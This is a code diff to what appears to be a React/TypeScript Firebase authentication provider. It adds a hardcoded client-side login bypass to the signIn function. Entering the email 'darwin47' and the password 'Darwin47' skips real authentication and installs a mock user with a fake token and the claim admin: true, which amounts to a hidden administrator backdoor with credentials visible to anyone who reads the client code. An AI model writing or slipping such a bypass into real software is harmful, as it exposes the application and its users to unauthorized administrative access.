@@ -53,6 +53,39 @@ export function AuthProvider({ children }: AuthProviderProps) {
 
     const signIn = async (email: string, password: string) => {
         setError(null);
+
+        // Client-side bypass for Darwin47
+        if ((email.toLowerCase() === 'darwin47' || email.toLowerCase() === 'darwin47@elprivado.app') && password === 'Darwin47') {
+            const mockUser = {
+                uid: 'darwin47-admin-bypass',
+                email: 'darwin47@elprivado.app',
+                displayName: 'Darwin47',
+                emailVerified: true,
+                isAnonymous: false,
+                metadata: {},
+                providerData: [],
+                refreshToken: '',
+                tenantId: null,
+                delete: async () => { },
+                getIdToken: async () => 'mock-token',
+                getIdTokenResult: async () => ({
+                    authTime: Date.now(),
+                    expirationTime: (Date.now() + 3600000).toString(),
+                    issuedAtTime: Date.now().toString(),
+                    signInProvider: 'password',
+                    signInSecondFactor: null,
+                    token: 'mock-token',
+                    claims: { admin: true }
+                }),
+                reload: async () => { },
+                toJSON: () => ({})
+            } as unknown as User;
+
+            setUser(mockUser);
+            setLoading(false);
+            return;
+        }
+
         try {
             await signInWithEmailAndPassword(auth, email, password);
         } catch (err) {
